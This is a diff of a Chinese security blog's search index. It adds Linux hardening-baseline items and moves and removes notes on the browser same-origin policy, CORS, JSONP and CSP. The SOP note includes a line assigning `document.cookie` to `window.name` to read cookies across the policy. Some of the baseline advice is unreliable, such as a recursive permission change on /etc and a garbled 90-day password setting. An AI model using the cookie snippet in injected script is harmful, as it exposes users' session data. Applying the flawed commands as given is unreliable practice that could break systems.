+<h1 id="十一、ssh登录配置"><a href="#十一、ssh登录配置" class="headerlink" title="十一、ssh登录配置"></a>十一、ssh登录配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：SSH登录配置</span><br><span class="line">配置要求：系统应配置使用SSH等加密协议进行远程登录维护，并安全配置SSHD的设置。不使用TELENT进行远程登录维护。</span><br><span class="line">操作指南：1、查看SSH服务状态：# ps –elf|grep ssh；</span><br><span class="line">          2、查看telnet服务状态：# ps –elf|grep telnet。</span><br><span class="line">检查方法：1、	不能使用telnet进行远程维护；</span><br><span class="line">          2、	应使用SSH进行远程维护；</span><br><span class="line">          3、	SSH配置要符合如下要求；</span><br><span class="line">              Protocol  2 #使用ssh2版本</span><br><span class="line">              X11Forwarding yes #允许窗口图形传输使用ssh加密</span><br><span class="line">              IgnoreRhosts  yes#完全禁止SSHD使用.rhosts文件</span><br><span class="line">              RhostsAuthentication no #不设置使用基于rhosts的安全验证</span><br><span class="line">              RhostsRSAAuthentication no #不设置使用RSA算法的基于rhosts的安全验证</span><br><span class="line">              HostbasedAuthentication no #不允许基于主机白名单方式认证</span><br><span class="line">              PermitRootLogin no #不允许root登录</span><br><span class="line">              PermitEmptyPasswords no #不允许空密码</span><br><span class="line">              Banner /etc/motd  #设置ssh登录时显示的banner</span><br><span class="line">          4、以上条件都满足为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            编辑 sshd_config，添加相关设置，SSHD相关安全设置选项参考检查方法中的描述。</span><br><span class="line">          2、补充操作说明</span><br><span class="line">            查看SSH服务状态：# ps –elf|grep ssh</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十二、关闭不必要的服务"><a href="#十二、关闭不必要的服务" class="headerlink" title="十二、关闭不必要的服务"></a>十二、关闭不必要的服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关闭不必要的系统服务</span><br><span class="line">配置要求：根据每台机器的不同角色，关闭不需要的系统服务。操作指南中的服务项提供参考，根据服务器的角色和应用情况对启动项进行修改。</span><br><span class="line">如无特殊需要，应关闭Sendmail、Telnet、Bind等服务。</span><br><span class="line">操作指南：执行命令 #chkconfig --list，查看哪些服务开放。</span><br><span class="line">检查方法：与管理员确认无用服务已关闭</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">        使用如下方式禁用不必要的服务</span><br><span class="line">        #service &lt;服务名&gt; stop</span><br><span class="line">        #chkconfig --level 35 off</span><br><span class="line">        2、参考说明</span><br><span class="line">        Linux/Unix系统服务中，部分服务存在较高安全风险，应当禁用，包括：</span><br><span class="line">        “lpd”，此服务为行式打印机后台程序，用于假脱机打印工作的UNIX后台程序，此服务通常情况下不用，建议禁用；</span><br><span class="line">        “telnet”，此服务采用明文传输数据，登陆信息容易被窃取，建议用ssh代替；</span><br><span class="line">        “routed”，此服务为路由守候进程，使用动态RIP路由选择协议，建议禁用；</span><br><span class="line">        “sendmail”，此服务为邮件服务守护进程，非邮件服务器应将其关闭；</span><br><span class="line">        “Bluetooth”，此服务为蓝牙服务，如果不需要蓝牙服务时应关闭；</span><br><span class="line">        “identd”，此服务为AUTH服务，在提供用户信息方面与finger类似，一般情况下该服务不是必须的，建议关闭；</span><br><span class="line">        “xfs”，此服务为Linux中X Window的字体服务，关于该服务历史上出现过信息泄露和拒绝服务等漏洞，应以减少系统风险；</span><br><span class="line">        R服务（“rlogin”、“rwho”、“rsh”、“rexec”），R服务设计上存在严重的安全缺陷，仅适用于封闭环境中信任主机之间便捷访问，</span><br><span class="line">        其他场合下均必须禁用；</span><br><span class="line">        基于inetd/xinetd的服务（daytime、chargen、echo等），此类服务建议禁用。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十三、禁止ctr-alt-del键盘关闭命令"><a href="#十三、禁止ctr-alt-del键盘关闭命令" class="headerlink" title="十三、禁止ctr+alt+del键盘关闭命令"></a>十三、禁止ctr+alt+del键盘关闭命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：禁止Control-Alt-Delete键盘关闭命令</span><br><span class="line">配置要求：应禁止使用Control-Alt-Delete组合键重启服务器，防止误操作</span><br><span class="line">操作指南：命令cat /etc/inittab，查看配置</span><br><span class="line">检查方法：/etc/inittab 中应有：“#ca::ctrlaltdel:/sbin/shutdown -t3 -r now”配置为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            在“/etc/inittab” 文件中注释掉下面这行（使用#）： ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            改为： #ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            为了使此改动生效，输入下面这个命令： # /sbin/init q</span><br><span class="line">        2、补充说明</span><br><span class="line">            禁止ctl-alt-del使得在控制台直接按ctl-alt-del不能重新启动计算机。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十四、安装操作系统补丁"><a href="#十四、安装操作系统补丁" class="headerlink" title="十四、安装操作系统补丁"></a>十四、安装操作系统补丁</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安装操作系统更新补丁</span><br><span class="line">配置要求：安装操作系统更新补丁，修复系统漏洞</span><br><span class="line">操作指南：1、查看当前系统补丁版本</span><br><span class="line">          2、检查官网当前系统版本是否发布安全更新。</span><br><span class="line">检查方法：版本应保持为最新</span><br><span class="line">配置方法：通过访问</span><br><span class="line">https://rhn.redhat.com/errata/下载补丁安装包，在打开的页面上，选择与自己使用相对应的系统后，点击连接进入补丁包下载列表界面，</span><br><span class="line">选择需要的补丁下载。</span><br><span class="line">         下载的补丁为rpm安装包，将该安装包复制到目标系统上，使用命令rpm –ivh xxx.rpm进行安装，随后重新启动系统，</span><br><span class="line">         检查所安装补丁的服务或应用程序是否运行正常，即完成该补丁的安装和升级工作。</span><br><span class="line">适用版本：Linux Redhat AS 3 Linux Redhat AS 4</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>安全基线</tag>
       </tags>
   </entry>
   <entry>
@@ -2264,9 +2318,68 @@
       </categories>
       <tags>
         <tag>XXE</tag>
-        <tag>PHP</tag>
         <tag>漏洞原理</tag>
+        <tag>PHP</tag>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>同源策略———SOP</title>
+    <url>/2025/04/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
+    <content><![CDATA[<h1 id="同源策略———SOP"><a href="#同源策略———SOP" class="headerlink" title="同源策略———SOP"></a>同源策略———SOP</h1><p>该笔记参考以下文章</p>
+<p><a href="https://www.jianshu.com/p/beb059c43a8b">前端必备HTTP技能之同源策略详解</a></p>
+<h1 id="同源策略概述"><a href="#同源策略概述" class="headerlink" title="同源策略概述"></a>同源策略概述</h1><p>同源策略规定了两个页面之间互相访问数据的规则。即只有在同一个源下的页面才能互相访问彼此的页面数据。该机制可以阻止某个页面中的恶意脚本对其他页面的敏感信息的访问。</p>
+<p>同源策略对于使用cookie保存session信息来实现身份认证的浏览器来说具有重大意义</p>
+<p>源是通过<code>协议、主机、端口</code>来定义的，只有这三者保持一致的时候猜被认为是同源的，不同源的页面之间是不能互相访问的</p>
+<h1 id="如何规避同源策略—-跨域通信手段"><a href="#如何规避同源策略—-跨域通信手段" class="headerlink" title="如何规避同源策略—-跨域通信手段"></a>如何规避同源策略—-跨域通信手段</h1><p><a href="http://codercto.com/a/29007.html">浅谈sop、cors和csp</a></p>
+<p>我们的网站如果有两个主机，那么因为同源策略的限制他们之间就不能互相交换数据，这明显是不符合要求的，那么怎么规避掉同源策略呢</p>
+<h2 id="使用document-domain"><a href="#使用document-domain" class="headerlink" title="使用document.domain"></a>使用document.domain</h2><p>将两个主机的源设置为同一个，此时他们之间就可以互相访问资源了</p>
+<p>这个方法有一个问题就是，我们在修改源的时候，可能把端口号修改为null，此时两个网站就不同源了。只有cookie和iframe共享可通过该方式设置，不能共享localstorage和indexdb</p>
+<h2 id="使用window-name"><a href="#使用window-name" class="headerlink" title="使用window.name"></a>使用window.name</h2><p>window.name中的值不受同源策略的限制，我们可以在注入的语句中将我们想要的数据赋值给window.name，然后再获取，如：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span>=<span class="variable language_">document</span>.<span class="property">cookie</span> #这样就可以绕过同源策略获取当前页面的cookie</span><br></pre></td></tr></table></figure>
+
+<p>在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p>
+<h2 id="CORS-跨域资源访问"><a href="#CORS-跨域资源访问" class="headerlink" title="CORS 跨域资源访问"></a>CORS 跨域资源访问</h2><p>允许浏览器向跨源<a href="http://www.codercto.com/category/server.html">服务器</a>发XMLHttpRequest请求，突破了ajax只能同源的限制，并且和ajax代码一样，关键在服务器的cors配置。该策略限制的是浏览器对目的地址的读取，即在浏览器发出请求后，目的地址的资源已经成功被浏览器加载了，但是因为cors的存在所以浏览器会判断下列字段，确定发出请求的网页是否有加载该资源的权限。</p>
+<p>**Access-control-allow-origin：**设置哪写源的网页可以访问本网页的资源</p>
+<p><strong>Access-Control-ALlow-Method:允许的请求方法</strong></p>
+<p><strong>Access-Control-Expose-Headers:时候允许返回自定义的heep头字段</strong></p>
+<p><strong>Access-Control-Allow-Credentials:是否允许发cookie</strong></p>
+<p><strong>cors分为简单请求与非简单请求</strong></p>
+<p>简单请求</p>
+<p>方法：head\get\post</p>
+<p>http头：acao必选 aceh acac可选</p>
+<p>非简单请求</p>
+<p>先进行预检请求options</p>
+<p>http头：acao acae 必选 acrh可选</p>
+<h2 id="跨文档通信"><a href="#跨文档通信" class="headerlink" title="跨文档通信"></a>跨文档通信</h2><p>这种方式允许一个页面的脚本发送文本信息到另一个页面的脚本中，不管脚本是否跨域。在一个window对象上调用<code>postMessage()</code>会异步的触发window上的<code>onmessage</code>事件，然后触发定义好的事件处理方法。一个页面上的脚本仍然不能直接访问另外一个页面上的方法或者变量，但是他们可以安全的通过消息传递技术交流。</p>
+<h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>websocket是为了解决http协议的一些问题而产生的，相比于http协议，websocket是一种全双工的协议，不像http协议只支持简单的请求响应单项链接，websocket协议中服务端可以主动向客户端推送消息。同时websocket协议不受同源策略的限制，使用的端口号也是80和443，协议标志位ws 和wss。数据格式更加轻量化，额外开支小，更好的二进制支持。但在握手阶段还是采用的http协议。</p>
+<p>现代浏览器允许脚本直连一个WebSocket地址而不管同源策略。然而，使用WebSocket URI的时候，在请求中插入<code>Origin</code>头就可以标识脚本请求的源。为了确保跨站安全，WebSocket服务器必须根据允许接受请求的白名单中的源列表比较头数据</p>
+<blockquote>
+<p>既然是在请求头中添加的策略，那么是否存在被篡改的风险</p>
+</blockquote>
+<p><strong>拓展：与服务端通信的方法—-ajax轮询、long polling 长轮询、websocket</strong></p>
+<p>ajax:定时向服务端发送请求</p>
+<p>long polling:客户端与服务器保持一个长连接，等到服务端有消息返回，断开。再重新链接</p>
+<p>web socket ：客户端发起http请求，告诉服务器进行websocket通信，并告知版本，服务器确认版本、协议，后开始进行websocket通信。</p>
+<h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>ajax受同源策略的限制不允许跨域访问资源，但蕾西与script\a\img这类带有src属性的标签却可以跨域调用js脚本，我们利用这个特性，返回一个js函数，在src属性中进行调用，从而实现了跨域。jsonp只支持get方法，只解决了跨域请求，不能解决不同域的页面之间的js调用问题。</p>
+<h2 id="片段"><a href="#片段" class="headerlink" title="#片段"></a>#片段</h2><p>利用锚点的的特性，父窗口可以把数据写到子窗口url的锚点后面发送给子窗口。</p>
+<h2 id="不受同源策略限制的标签—-jsonp"><a href="#不受同源策略限制的标签—-jsonp" class="headerlink" title="不受同源策略限制的标签—-jsonp"></a>不受同源策略限制的标签—-jsonp</h2><script>、<img>、<link>、<iframe>等带src属性的标签可以从外域加载资源，但不可以读资源
+
+页面内加载的JS文件本身放在哪里并不重要，只要它被谁加载了，就和谁同源。
+
+## CSP———-内容安全策略
+
+允许哪些资源的那些来源加载，该策略限制请求是否发出，浏览器在发出请求前，先读取当前页面的csp，对比目的地址是否符合scp策略，如果符合才发起跨域请求。
+
+通过`Content-Security-Policy:policy`]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>浏览器</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>同源策略</tag>
+        <tag>SOP</tag>
       </tags>
   </entry>
   <entry>
@@ -2798,166 +2911,6 @@
       </tags>
   </entry>
   <entry>
-    <title>同源策略———SOP</title>
-    <url>/2025/04/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
-    <content><![CDATA[<h1 id="同源策略———SOP"><a href="#同源策略———SOP" class="headerlink" title="同源策略———SOP"></a>同源策略———SOP</h1><p>该笔记参考以下文章</p>
-<p><a href="https://www.jianshu.com/p/beb059c43a8b">前端必备HTTP技能之同源策略详解</a></p>
-<h1 id="同源策略概述"><a href="#同源策略概述" class="headerlink" title="同源策略概述"></a>同源策略概述</h1><p>同源策略规定了两个页面之间互相访问数据的规则。即只有在同一个源下的页面才能互相访问彼此的页面数据。该机制可以阻止某个页面中的恶意脚本对其他页面的敏感信息的访问。</p>
-<p>同源策略对于使用cookie保存session信息来实现身份认证的浏览器来说具有重大意义</p>
-<p>源是通过<code>协议、主机、端口</code>来定义的，只有这三者保持一致的时候猜被认为是同源的，不同源的页面之间是不能互相访问的</p>
-<h1 id="如何规避同源策略—-跨域通信手段"><a href="#如何规避同源策略—-跨域通信手段" class="headerlink" title="如何规避同源策略—-跨域通信手段"></a>如何规避同源策略—-跨域通信手段</h1><p><a href="http://codercto.com/a/29007.html">浅谈sop、cors和csp</a></p>
-<p>我们的网站如果有两个主机，那么因为同源策略的限制他们之间就不能互相交换数据，这明显是不符合要求的，那么怎么规避掉同源策略呢</p>
-<h2 id="使用document-domain"><a href="#使用document-domain" class="headerlink" title="使用document.domain"></a>使用document.domain</h2><p>将两个主机的源设置为同一个，此时他们之间就可以互相访问资源了</p>
-<p>这个方法有一个问题就是，我们在修改源的时候，可能把端口号修改为null，此时两个网站就不同源了。只有cookie和iframe共享可通过该方式设置，不能共享localstorage和indexdb</p>
-<h2 id="使用window-name"><a href="#使用window-name" class="headerlink" title="使用window.name"></a>使用window.name</h2><p>window.name中的值不受同源策略的限制，我们可以在注入的语句中将我们想要的数据赋值给window.name，然后再获取，如：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span>=<span class="variable language_">document</span>.<span class="property">cookie</span> #这样就可以绕过同源策略获取当前页面的cookie</span><br></pre></td></tr></table></figure>
-
-<p>在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p>
-<h2 id="CORS-跨域资源访问"><a href="#CORS-跨域资源访问" class="headerlink" title="CORS 跨域资源访问"></a>CORS 跨域资源访问</h2><p>允许浏览器向跨源<a href="http://www.codercto.com/category/server.html">服务器</a>发XMLHttpRequest请求，突破了ajax只能同源的限制，并且和ajax代码一样，关键在服务器的cors配置。该策略限制的是浏览器对目的地址的读取，即在浏览器发出请求后，目的地址的资源已经成功被浏览器加载了，但是因为cors的存在所以浏览器会判断下列字段，确定发出请求的网页是否有加载该资源的权限。</p>
-<p>**Access-control-allow-origin：**设置哪写源的网页可以访问本网页的资源</p>
-<p><strong>Access-Control-ALlow-Method:允许的请求方法</strong></p>
-<p><strong>Access-Control-Expose-Headers:时候允许返回自定义的heep头字段</strong></p>
-<p><strong>Access-Control-Allow-Credentials:是否允许发cookie</strong></p>
-<p><strong>cors分为简单请求与非简单请求</strong></p>
-<p>简单请求</p>
-<p>方法：head\get\post</p>
-<p>http头：acao必选 aceh acac可选</p>
-<p>非简单请求</p>
-<p>先进行预检请求options</p>
-<p>http头：acao acae 必选 acrh可选</p>
-<h2 id="跨文档通信"><a href="#跨文档通信" class="headerlink" title="跨文档通信"></a>跨文档通信</h2><p>这种方式允许一个页面的脚本发送文本信息到另一个页面的脚本中，不管脚本是否跨域。在一个window对象上调用<code>postMessage()</code>会异步的触发window上的<code>onmessage</code>事件，然后触发定义好的事件处理方法。一个页面上的脚本仍然不能直接访问另外一个页面上的方法或者变量，但是他们可以安全的通过消息传递技术交流。</p>
-<h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>websocket是为了解决http协议的一些问题而产生的，相比于http协议，websocket是一种全双工的协议，不像http协议只支持简单的请求响应单项链接，websocket协议中服务端可以主动向客户端推送消息。同时websocket协议不受同源策略的限制，使用的端口号也是80和443，协议标志位ws 和wss。数据格式更加轻量化，额外开支小，更好的二进制支持。但在握手阶段还是采用的http协议。</p>
-<p>现代浏览器允许脚本直连一个WebSocket地址而不管同源策略。然而，使用WebSocket URI的时候，在请求中插入<code>Origin</code>头就可以标识脚本请求的源。为了确保跨站安全，WebSocket服务器必须根据允许接受请求的白名单中的源列表比较头数据</p>
-<blockquote>
-<p>既然是在请求头中添加的策略，那么是否存在被篡改的风险</p>
-</blockquote>
-<p><strong>拓展：与服务端通信的方法—-ajax轮询、long polling 长轮询、websocket</strong></p>
-<p>ajax:定时向服务端发送请求</p>
-<p>long polling:客户端与服务器保持一个长连接，等到服务端有消息返回，断开。再重新链接</p>
-<p>web socket ：客户端发起http请求，告诉服务器进行websocket通信，并告知版本，服务器确认版本、协议，后开始进行websocket通信。</p>
-<h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>ajax受同源策略的限制不允许跨域访问资源，但蕾西与script\a\img这类带有src属性的标签却可以跨域调用js脚本，我们利用这个特性，返回一个js函数，在src属性中进行调用，从而实现了跨域。jsonp只支持get方法，只解决了跨域请求，不能解决不同域的页面之间的js调用问题。</p>
-<h2 id="片段"><a href="#片段" class="headerlink" title="#片段"></a>#片段</h2><p>利用锚点的的特性，父窗口可以把数据写到子窗口url的锚点后面发送给子窗口。</p>
-<h2 id="不受同源策略限制的标签—-jsonp"><a href="#不受同源策略限制的标签—-jsonp" class="headerlink" title="不受同源策略限制的标签—-jsonp"></a>不受同源策略限制的标签—-jsonp</h2><script>、<img>、<link>、<iframe>等带src属性的标签可以从外域加载资源，但不可以读资源
-
-页面内加载的JS文件本身放在哪里并不重要，只要它被谁加载了，就和谁同源。
-
-## CSP———-内容安全策略
-
-允许哪些资源的那些来源加载，该策略限制请求是否发出，浏览器在发出请求前，先读取当前页面的csp，对比目的地址是否符合scp策略，如果符合才发起跨域请求。
-
-通过`Content-Security-Policy:policy`]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>浏览器</category>
-      </categories>
-      <tags>
-        <tag>浏览器</tag>
-        <tag>同源策略</tag>
-        <tag>SOP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux安全配置基线</title>
-    <url>/2025/04/10/linux%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E5%9F%BA%E7%BA%BF/</url>
-    <content><![CDATA[<h1 id="linux安全配置基线"><a href="#linux安全配置基线" class="headerlink" title="linux安全配置基线"></a>linux安全配置基线</h1><h1 id="一、共享账号检查"><a href="#一、共享账号检查" class="headerlink" title="一、共享账号检查"></a>一、共享账号检查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户账号分配检查，避免共享账号存在</span><br><span class="line">配置要求：1、系统需按照实际用户分配账号；</span><br><span class="line">          2、避免不同用户间共享账号，避免用户账号和服务器间通信使用的账号共享。</span><br><span class="line">操作指南：参考配置操作：cat /etc/passwd查看当前所有用户的情况；</span><br><span class="line">检查方法：命令cat /etc/passwd查看当前所有用户的信息，与管理员确认是否有共享账号情况存在。</span><br><span class="line">配置方法：如需建立用户，参考如下：</span><br><span class="line">          #useradd username  #创建账号</span><br><span class="line">          #passwd username   #设置密码</span><br><span class="line">          使用该命令为不同的用户分配不同的账号，设置不同的口令及权限信息等。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="二、多余账户锁定"><a href="#二、多余账户锁定" class="headerlink" title="二、多余账户锁定"></a>二、多余账户锁定</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：多余账户锁定策略</span><br><span class="line">配置要求：应锁定与设备运行、维护等工作无关的账号。</span><br><span class="line">操作指南：参考配置操作：</span><br><span class="line">          查看锁定用户：</span><br><span class="line">          # cat /etc/password，查看哪些账户的shell域中为nologin；</span><br><span class="line">检查方法：人工检查：</span><br><span class="line">          	# cat /etc/password后查看多余账户的shell域为nologin为符合；</span><br><span class="line">          BVS基线检查：</span><br><span class="line">          	多余账户处于锁定状态为符合。</span><br><span class="line">配置方法：锁定用户：</span><br><span class="line">        修改/etc/password文件，将需要锁定的用户的shell域设为nologin；</span><br><span class="line">        或通过#passwd –l username锁定账户；</span><br><span class="line">        只有具备超级用户权限的使用者方可使用#passwd –l username锁定用户,用#passwd –d username解锁后原有密码失效，登录需输入新密码。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        一般情况下，需要锁定的用户：lp,nuucp,hpdb,www,demon</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、root账户登录控制"><a href="#三、root账户登录控制" class="headerlink" title="三、root账户登录控制"></a>三、root账户登录控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：root账户远程登录账户限制</span><br><span class="line">配置要求：1、限制具备超级管理员权限的用户远程登录。</span><br><span class="line">          2、远程执行管理员权限操作，应先以普通权限用户远程登录后，再切换到超级管理员权限账号后执行相应操作。</span><br><span class="line">操作指南：使用root账户远程尝试登陆</span><br><span class="line">检查方法：1、root远程登录不成功，提示“Not on system console”；</span><br><span class="line">         2、普通用户可以登录成功，而且可以切换到root用户；</span><br><span class="line">配置方法：修改/etc/ssh/sshd_config文件，将PermitRootLogin yes改为PermitRootLogin no，重启sshd服务。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="四、口令复杂度要求"><a href="#四、口令复杂度要求" class="headerlink" title="四、口令复杂度要求"></a>四、口令复杂度要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：操作系统口令复杂度策略</span><br><span class="line">配置要求：口令长度至少12位，并包括数字、小写字母、大写字母和特殊符号。</span><br><span class="line">操作指南：1、参考配置操作</span><br><span class="line">        # cat /etc/pam.d/system-auth，找到password模块接口的配置部分，找到类似如下的配置行：</span><br><span class="line">        password  requisite  /lib/security/$ISA/pam_cracklib.so minlen =6</span><br><span class="line">        2、补充操作说明</span><br><span class="line">        参数说明如下：</span><br><span class="line">        1、retry=N，确定用户创建密码时允许重试的次数；</span><br><span class="line">        2、minlen=N，确定密码最小长度要求，事实上，在默认配置下，此参数代表密码最小长度为N-1；</span><br><span class="line">        3、dcredit=N，当N小于0时，代表新密码中数字字符数量不得少于（-N）个。例如，dcredit=-2代表密码中要至少包含两个数字字符；</span><br><span class="line">        4、ucredit=N，当N小于0时，代表则新密码中大写字符数量不得少于（-N）个；</span><br><span class="line">        5、lcredit=N，当N小于0时，代表则新密码中小写字符数量不得少于（-N）个；</span><br><span class="line">        6、ocredit=N，当N小于0时，代表则新密码中特殊字符数量不得少于（-N）个；</span><br><span class="line">检查方法：# cat /etc/pam.d/system-auth，参考操作指南检查对应参数</span><br><span class="line">         	口令的最小长度至少12位</span><br><span class="line">         	口令最少应包含的字符数量</span><br><span class="line">         	口令中最少应包含的字母字符数量</span><br><span class="line">         	口令中最少应包含的非字母数字字符数量</span><br><span class="line">         通过以上4子项的输出综合判断该项是否满足。</span><br><span class="line">配置方法：# vi /etc/pam.d/system-auth，找到password模块接口的配置部分，按照配置要求内容修改对应属性。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="五、口令最长生存期策略"><a href="#五、口令最长生存期策略" class="headerlink" title="五、口令最长生存期策略"></a>五、口令最长生存期策略</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：口令最长生存期策略</span><br><span class="line">配置要求：要求操作系统的账户口令的最长生存期不长于90天</span><br><span class="line">操作指南：# cat /etc/login.defs文件中指定配置项，其中：</span><br><span class="line">          PASS_MAX_DAYS配置项决定密码最长使用期限；</span><br><span class="line">          PASS_MIN_DAYS配置项决定密码最短使用期限；</span><br><span class="line">          PASS_WARN_AGE配置项决定密码到期提醒时间。</span><br><span class="line">检查方法：PASS_MAX_DAYS值小于等于90为符合；</span><br><span class="line">         “对于采用静态口令认证技术的设备，账户口令的生存期不长于90天”项的当前值：表示当前的口令生存期长度。</span><br><span class="line">配置方法：vi /etc/login.defs文件，修改PASS_MAX_DAYS值为小于等于9</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="六、系统关键目录访问权限"><a href="#六、系统关键目录访问权限" class="headerlink" title="六、系统关键目录访问权限"></a>六、系统关键目录访问权限</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关键目录权限控制</span><br><span class="line">配置要求：根据安全需要，配置某些关键目录其所需的最小权限；</span><br><span class="line">          重点要求password配置文件、shadow文件、group文件权限。</span><br><span class="line">         当前主流版本的linux系统在默认情况下即对重要文件做了必要的权限设置，在日常管理和操作过程中应避免修改此类文件权限，除此以外，</span><br><span class="line">         应定期对权限进行检查及复核，确保权限设置正确。</span><br><span class="line">操作指南：查看关键目录的用户对应权限参考命令</span><br><span class="line">          ls -l /etc/passwd</span><br><span class="line">          ls -l /etc/shadow</span><br><span class="line">          ls -l /etc/group</span><br><span class="line">检查方法：与管理员确认已有权限为最小权限。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">        通过chmod命令对目录的权限进行实际设置。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        	/etc/passwd 所有用户都可读，root用户可写 –rw-r—r— </span><br><span class="line">        配置命令：chmod 644 /etc/passwd</span><br><span class="line">        	/etc/shadow 只有root可读 –r-------- </span><br><span class="line">        配置命令：chmod 600 /etc/shadow；</span><br><span class="line">        	/etc/group 必须所有用户都可读，root用户可写 –rw-r—r—</span><br><span class="line">        配置命令：chmod 644 /etc/group；</span><br><span class="line">        如果是有写权限，就需移去组及其它用户对/etc的写权限（特殊情况除外）执行命令#chmod -R go-w,o-r /etc</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="七、用户缺省权限控制"><a href="#七、用户缺省权限控制" class="headerlink" title="七、用户缺省权限控制"></a>七、用户缺省权限控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户缺省权限控制</span><br><span class="line">配置要求：控制用户缺省访问权限，当在创建新文件或目录时应屏蔽掉新文件或目录不应有的访问允许权限,防止同属于</span><br><span class="line">该组的其它用户及别的组的用户修改该用户的文件或更高限制。</span><br><span class="line">操作指南：1、# cat /etc/bashrc  查看全局默认设置umask值</span><br><span class="line">          2、查看具体用户home目录下bash_profile，具体用户的umask</span><br><span class="line">检查方法：查看全局默认设置umask值为027或更小权限为符合（如有特许权限需求，可根据实际情况判断）；</span><br><span class="line">          查看具体用户的umask，本着最小权限的原则。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          单独针对用户设置</span><br><span class="line">          可修改用户home目录下的.bash_profile脚本文件，例如，可增加一条语句：umask 027；对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">          全局默认设置：</span><br><span class="line">          默认通过全局脚本/etc/bashrc设置所有用户的默认umask值，修改脚本即可实现对用户默认umask值的全局性修改，</span><br><span class="line">          通常建议将umask设置为027以上，对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="八、安全日志完备性要求"><a href="#八、安全日志完备性要求" class="headerlink" title="八、安全日志完备性要求"></a>八、安全日志完备性要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安全日志完备性要求</span><br><span class="line">配置要求：系统应配置完备日志记录，记录对与系统相关的安全事件。</span><br><span class="line">操作指南：1、# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">          2、# cat /var/log/secure查看是否有对应配置</span><br><span class="line">检查方法：1、cat /etc/syslog.conf确认有对应配置；</span><br><span class="line">          2、查看/var/log/secure，应记录有需要的设备相关的安全事件。</span><br><span class="line">配置方法：修改配置文件vi /etc/syslog.conf。</span><br><span class="line">          配置如下类似语句：</span><br><span class="line">          authpriv.*			/var/log/secure</span><br><span class="line">          定义为需要保存的设备相关安全事件。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
